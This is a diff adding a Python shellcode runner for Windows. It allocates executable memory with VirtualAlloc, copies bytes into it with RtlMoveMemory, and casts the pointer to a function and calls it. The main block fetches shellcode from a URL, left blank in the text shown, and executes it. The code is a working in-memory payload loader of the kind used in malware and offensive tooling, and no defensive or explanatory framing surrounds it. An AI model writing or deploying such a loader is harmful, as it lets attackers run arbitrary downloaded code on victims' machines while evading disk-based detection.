@@ -31,4 +31,24 @@ def write_memory(buf):
     ctypes.c_void_p: The destination memory address (a pointer to where data will be copied).
     ctypes.c_void_p: The source memory address (a pointer to the data to copy).
     ctypes.c_size_t: The number of bytes to copy (a size type, typically an unsigned integer).
-    '''    
+    '''
+    ptr = kernel32.VirtualAlloc(None,length,0x3000,0x40)#Allocating memory
+    kernel32.RtlMoveMemory(ptr,buf,length)#Writing raw bytes to that memory
+    #copies length bytes from buf (Python bytes object or pointer) to ptr (your allocated memory).
+    
+    return ptr
+
+def run(shellcode):
+    buffer = ctypes.create_string_buffer(shellcode)
+    
+    ptr = write_memory(buffer)
+    
+    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
+    shell_func()
+
+if __name__ == '__main__':
+    url = ""
+    shellcode = get_code(url)
+    run(shellcode)    
+    
+    
